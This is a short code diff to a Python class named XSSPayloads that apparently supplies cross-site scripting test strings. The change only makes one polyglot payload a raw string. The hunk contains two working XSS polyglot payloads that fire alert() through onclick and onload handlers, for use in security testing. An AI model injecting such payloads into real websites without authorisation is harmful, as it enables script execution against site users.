@@ -201,7 +201,7 @@ class XSSPayloads:
     
     # Polyglot (work in multiple contexts)
     POLYGLOT = [
-        '''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e''',
+        r'''jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e''',
         '''"onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//''',
     ]
     
